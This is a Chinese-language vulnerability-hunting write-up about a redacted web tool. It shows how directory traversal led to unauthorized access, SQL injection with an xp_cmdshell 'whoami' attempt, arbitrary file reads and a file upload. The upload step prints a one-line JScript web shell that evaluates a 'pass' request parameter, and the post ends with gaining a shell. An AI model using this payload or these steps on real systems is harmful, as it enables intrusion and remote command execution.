## 漏洞初现

从扫描结果来看，这是一个文件夹。

## 漏洞再现

通过目录遍历漏洞，发现一个命名很有趣的文件，叫做AxxxxxxxxxxTool.xxxl。![](../Images/d2a040a60cd4e16a92e32191f3a77980.png)

点开呢，会跳转到一个很神奇的页面。

![](../Images/59325ee980fc02e1f4cf771af807e200.png)

有人又捞到一个未授权访问，但我不说是谁🤭

## 漏洞叒现

虽然满屏的sql记录，但是没找到可以利用的点，很不甘心。

所以想找一下这个页面是不是调用了一些API接口。

![](../Images/e2e20eaaf197efb0975c1ff13c8e180d.png)![](../Images/9c626b27cb01af4afca9db5a8efbb1e3.png)

看来是没有了。

经过上一次挖掘漏洞的经历，我习惯性搜索了sql关键字。

burp看得太难受了，右键查看view-source，copy到Sublime，查找sql关键字。

功夫不负有心人，过了3秒，就找到一个sql的入口点。

![](../Images/a40afbc5ca9b77976bb5f51a10fcd186.png)

读一下代码，很简单。

请求:post

url：当前路径+?type=sql

data:sql=xxx&maxCount=xxx

构造数据包，如下

```
POST /scripts/AxxxxxxxxxxTool.xxxl?type

=sql HTTP/1.1
```

发包看看![](../Images/41fd27c89f150b12c8bd8069c194674b.png)

![](../Images/627861c61ce2a6626f0d9322f7b32f4a.png)

exec xp\_cmdshell "whoami" 试试看![](../Images/b02a79a94a0c5d47ff8c60ec02843a73.png)

完了，错失一个严重。

（👮‍：其实可以尝试开一下，但是要改系统配置，风险较大，这个想法比较可刑。）

![](../Images/2f66d23405be35b6920d43d3f5c17c0a.png)

SQL注入收入囊中。

## 漏洞叕现

继续探索view-source，就在云深不知处，发现了一个文件读取的入口点。

![](../Images/957cc59194714df77f02ef94dbc561cb.png)

和sql注入类似，构造数据包。

```
POST /scripts/AxxxxxxxxxxTool.xxxl?type

=file HTTP/1.1
```

![](../Images/2100b191034e6c9848d79f441a87e7e8.png)

任意文件读取收入囊中。

## 洞！来！

继续探索view-source，就在云深不不知处，发现一个文件上传的入口点。

![](../Images/ebb03e7e6b7087617fec25e3a6ecc7d4.png)

与之前sql注入，文件读取类似，构造数据包

```
POST /scripts/AxxxxxxxxxxTool.xxxl?type

=updatefile HTTP/1.1"Jscript"%><%eval(Request.Item["pass"],"unsafe"
);%>
```

![](../Images/4dd5b4724a71cae48f0c0de1c04a8c99.png)

成功上传！

getshell！
